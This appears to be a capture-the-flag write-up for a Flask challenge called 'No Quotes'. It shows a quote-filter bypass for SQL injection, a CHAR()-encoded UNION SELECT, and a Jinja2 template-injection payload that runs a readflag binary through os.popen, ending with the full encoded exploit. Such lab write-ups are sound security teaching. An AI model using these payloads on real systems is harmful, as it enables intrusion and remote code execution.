# No Quotes

## Recon

### Logging In

In `src/app.py` under the `login()` function we have an SQL injection attack surface.
```
query = (
    "SELECT id, username FROM users "
    f"WHERE username = ('{username}') AND password = ('{password}')"
)
```

This input however does have one layer of protection from the `waf()` function which flags any inputs containing quotes (single or double).
```
def waf(value: str) -> bool:
    blacklist = ["'", '"']
    return any(char in value for char in blacklist)
```

This can be bypassed with the following payload\
Username: `\`\
Password: `) OR 1=1 #`

### Read Flag

Looking at the provided Dockerfile, there's also a `readflag` binary that gets compiled which will give us the flag when run. This tells us our end goal will be to acheive RCE.

### SSTI

Finally, when logged in the page is rendered with this line.

```
return render_template_string(open("templates/home.html").read() % session["user"])
```

This takes the template `home.html` and directly inserts the string `session["user"]` into it to give the "Welcome, username" part of the page. If `session["user"]` can be controlled we can use SSTI to acheive remote code execution.

## Exploit

### SQLi Payload

We have all the pieces in place now. The first goal is to construct an SQL payload where `session["user"]` can be set to any value we want. Ideally, we would just reuse our previous injection with something like this:

Username: `\`\
Password: `) UNION SELECT 1, "<ssti-payload>" #`

We still have to get around that no quotes filter, so we can instead use encoding to avoid the filter. This will also allow us to use any characters we want in our SSTI payload without hitting the filter.

Username: `\`\
Password: `) UNION SELECT 1, CHAR(83,83,84,73) #`

### SSTI Payload

We already know our goal is to execute the shell command: `readflag`. Since, there are no protection in place we can just use a generic payload which I got from this [payload list](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md#jinja2---remote-command-execution).

`{{self.__init__.__globals__.__builtins__.__import__('os').popen('../readflag').read()}}`

Then, we can just convert all of these characters to their ASCII decimal equivalents.

### Getting the Flag

Putting those together we get the final payload:\
Username: `\`\
Password: `) UNION SELECT 1, CHAR(123,123,115,101,108,102,46,95,95,105,110,105,116,95,95,46,95,95,103,108,111,98,97,108,115,95,95,46,95,95,98,117,105,108,116,105,110,115,95,95,46,95,95,105,109,112,111,114,116,95,95,40,39,111,115,39,41,46,112,111,112,101,110,40,39,32,46,46,47,114,101,97,100,102,108,97,103,39,41,46,114,101,97,100,40,41,125,125) #`